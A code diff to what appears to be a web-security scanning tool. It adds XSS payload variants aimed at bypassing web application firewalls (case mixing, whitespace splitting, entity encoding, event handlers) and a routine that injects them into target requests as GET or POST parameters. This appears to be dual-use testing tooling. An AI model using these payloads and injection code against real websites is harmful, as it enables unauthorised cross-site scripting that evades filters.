@@ -3098,6 +3098,16 @@ class WordlistMapper:
             '<ScRiPt>alert(1)</sCrIpT>',
             '<IMG SRC="javascript:alert(1);">',
             '<a href="javascript:alert(1)">click</a>',
+            # Anchor tag mutation points (WAF bypass variants)
+            '<A HREF="javascript:alert(1)">x</A>',
+            '<a href="JaVaScRiPt:alert(1)">x</a>',
+            '<a href="java\tscript:alert(1)">x</a>',
+            '<a href="java\nscript:alert(1)">x</a>',
+            '<a href="&#106;avascript:alert(1)">x</a>',
+            "<a href='javascript:alert(1)'>x</a>",
+            '<a href=javascript:alert(1)>x</a>',
+            '<a onclick="alert(1)">x</a>',
+            '<a onmouseover="alert(1)">x</a>',
             '"><img src=x onerror=alert(1)>',
             "' onfocus=alert(1) autofocus='",
             '<input onfocus=alert(1) autofocus>',
@@ -4037,7 +4047,34 @@ class BypassManager:
                             request_params['url'] = f"{url}&payload={urllib.parse.quote(payload)}"
                         else:
                             request_params['url'] = f"{url}?payload={urllib.parse.quote(payload)}"
-            
+
+            elif bypass['type'] == 'Anchor Tag Mutation':
+                # Inject the mutated <a> tag as POST body parameter.
+                # The bypass stores the mutated anchor tag in bypass['payload'];
+                # if caller also supplied a payload we wrap it inside the anchor href.
+                anchor_payload = bypass.get('payload', '<a href="javascript:alert(1)">x</a>')
+                if payload:
+                    # Replace the first occurrence of the alert(1) placeholder with the
+                    # caller's payload. No URL-encoding here: urlencode() below handles
+                    # transport encoding for POST, and quote() handles GET params.
+                    anchor_payload = anchor_payload.replace('alert(1)', payload, 1)
+                curl_data = bypass.get('curl_data', {})
+                bm = curl_data.get('method', 'POST')
+                if bm == 'GET':
+                    sep = '&' if '?' in url else '?'
+                    request_params['url'] = f"{url}{sep}q={urllib.parse.quote(anchor_payload, safe='')}"
+                    request_params['method'] = 'GET'
+                else:
+                    request_params['method'] = 'POST'
+                    request_params['data'] = urllib.parse.urlencode(
+                        {'input': anchor_payload, 'q': anchor_payload}
+                    )
+                    if 'headers' not in request_params:
+                        request_params['headers'] = {}
+                    request_params['headers']['Content-Type'] = (
+                        'application/x-www-form-urlencoded'
+                    )
+
             else:
                 # Generic bypass - just add payload to URL
                 if payload:
@@ -4045,7 +4082,7 @@ class BypassManager:
                         request_params['url'] = f"{url}&payload={urllib.parse.quote(payload)}"
                     else:
                         request_params['url'] = f"{url}?payload={urllib.parse.quote(payload)}"
-            
+
             return request_params
             
         except Exception as e:
